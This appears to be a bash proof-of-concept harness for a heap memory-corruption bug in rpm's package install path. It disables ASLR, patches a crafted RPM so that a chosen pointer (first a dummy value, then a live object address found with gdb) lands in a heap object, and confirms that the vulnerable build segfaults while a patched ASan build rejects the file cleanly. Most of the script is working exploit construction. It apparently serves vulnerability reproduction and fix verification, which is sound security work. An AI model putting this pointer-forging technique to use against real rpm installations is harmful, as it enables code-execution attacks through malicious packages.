#!/usr/bin/env bash
# Chosen-byte GC pointer in a PLAIN rpm -i with ASLR disabled by setarch -R.
# No debugger is attached to the measured process. The 18-character config
# symlink and the long --dbpath/absolute fixture path are load-bearing: argv
# and environment length shift the natural heap adjacency (see PROVENANCE).
set -u
cd "$(dirname "$0")"
root=$(cd .. && pwd)
config=${RPM_CONFIGDIR_VULN:-$root/install-vuln/lib/rpm}
fixed_config=${RPM_CONFIGDIR_FIXED:-$root/build-fixed-asan}
[ -f "$config/rpmrc" ] || config=$root/build-vuln-asan
cfg_link=$(mktemp -d /tmp/r2s-cfg.XXXXX) || exit 1
rmdir "$cfg_link" || exit 1
ln -s "$config" "$cfg_link" || exit 1
vuln=$root/build-vuln-plain/tools/rpm
fixed=$root/build-fixed-asan/tools/rpm
command -v setarch >/dev/null || { echo "MISSING setarch"; exit 1; }
for bin in "$vuln" "$fixed"; do
    [ -x "$bin" ] || { echo "MISSING $bin"; exit 1; }
done
work=$PWD/gc-pointer
out=$PWD/setarch-nogdb
mkdir -p "$out" "$work/db"
: > "$out/summary.txt"
fixture=$work/attack-C-reloc.rpm
python3 - <<'PY' || exit 1
from pathlib import Path
src = Path("install/attack-reloc.rpm").read_bytes()
needle = b"MISHE-RPM!!" + b"A" * 53
assert src.count(needle) == 1, "one cpio payload expected"
Path("gc-pointer/attack-C-reloc.rpm").write_bytes(src)
PY
for p in /tmp/README /tmp/linkme /tmp/mydir /tmp/myscript.sh; do
    [ -e "$p" ] && { echo "REFUSE: $p exists"; exit 1; }
done
cleanup() {
    rm -f "$cfg_link" /tmp/README /tmp/linkme /tmp/myscript.sh
    rmdir /tmp/mydir 2>/dev/null || true
}
trap cleanup EXIT
fresh() { rm -rf "$work/db"; mkdir -p "$work/db"; }
args=(--dbpath "$work/db" -i --nodeps --noscripts --nodigest
      --nosignature --nofiledigest --ignoresize "$fixture")
pass=0
fail=0
ok()  { echo "PASS $1"; pass=$((pass + 1)); }
bad() { echo "FAIL $1"; fail=$((fail + 1)); }
info() { echo "INFO $1"; }
plain() { # name fixture-path expected-rc log
    fresh
    RPM_CONFIGDIR="$cfg_link" setarch -R "$vuln" \
        --dbpath "$work/db" -i --nodeps --noscripts --nodigest \
        --nosignature --nofiledigest --ignoresize "$2" > "$out/$1.log" 2>&1
    local rc=$?
    echo "$1 rc=$rc" >> "$out/summary.txt"
    if [ "$rc" -eq "$3" ]; then ok "$1 rc=$rc"; else bad "$1 rc=$rc want $3"; fi
}

# Wild chosen pointer: the plain ASLR-off process must dereference it.
python3 - <<'PY' || exit 1
from pathlib import Path
import struct
p = Path("gc-pointer/attack-C-reloc.rpm")
b = bytearray(p.read_bytes())
i = b.index(b"MISHE-RPM!!" + b"A" * 53) + 32
b[i:i+8] = struct.pack("<Q", 0x4242424242424242)
p.write_bytes(bytes(b))
PY
for n in 1 2 3; do plain "wild-$n" "$fixture" 139; done

# Restore A baseline. GDB observes a live GCObject address (no forced call),
# then the final runs are plain setarch -R processes with that address baked
# into the payload. A debugger-free valid target is NOT assumed here.
python3 - <<'PY' || exit 1
from pathlib import Path
src = Path("install/attack-reloc.rpm").read_bytes()
Path("gc-pointer/attack-C-reloc.rpm").write_bytes(src)
PY
fresh
gdb -q -batch \
    -ex "set environment RPM_CONFIGDIR $cfg_link" \
    -ex "directory $root/src/rpm/lib" \
    -x gc-pointer/discover.gdb --args "$vuln" "${args[@]}" \
    > "$out/discover.log" 2>&1
live=$(grep '^LIVE_VISIT=' "$out/discover.log" | tail -1 | cut -d= -f2)
echo "DISCOVER_LIVE=$live" >> "$out/summary.txt"
if [ -n "$live" ]; then
    python3 - "$live" <<'PY' || exit 1
from pathlib import Path
import struct, sys
p = Path("gc-pointer/attack-C-reloc.rpm")
b = bytearray(p.read_bytes())
i = b.index(b"MISHE-RPM!!" + b"A" * 53) + 32
b[i:i+8] = struct.pack("<Q", int(sys.argv[1], 16))
p.write_bytes(bytes(b))
PY
    for n in 1 2 3; do
        fresh
        RPM_CONFIGDIR="$cfg_link" setarch -R "$vuln" "${args[@]}" > "$out/valid-$n.log" 2>&1
        rc=$?
        echo "VALID_$n rc=$rc" >> "$out/summary.txt"
        info "valid-$n rc=$rc (no assertion: GDB and plain heap layouts differ)"
    done
fi

# Safe-input and fixed controls under the same ASLR-off conditions.
python3 - <<'PY' || exit 1
from pathlib import Path
src = Path("install/attack-reloc.rpm").read_bytes()
Path("gc-pointer/attack-C-reloc.rpm").write_bytes(src)
PY
for n in 1 2; do plain "safe-$n" "install/safe-newc.rpm" 1; done
fresh
RPM_CONFIGDIR="$fixed_config" ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
    "$fixed" --dbpath "$work/db" -i --nodeps --noscripts --nodigest \
    --nosignature --nofiledigest --ignoresize install/attack-reloc.rpm \
    > "$out/fixed-asan-attack.log" 2>&1
rc=$?
if [ "$rc" -eq 1 ] && ! grep -q AddressSanitizer "$out/fixed-asan-attack.log"; then
    ok "fixed ASan attack rc=1 clean"
else
    bad "fixed ASan attack rc=$rc"
fi

echo "SETARCH_NOGDB_PASS=$pass SETARCH_NOGDB_FAIL=$fail"
[ "$fail" -eq 0 ]
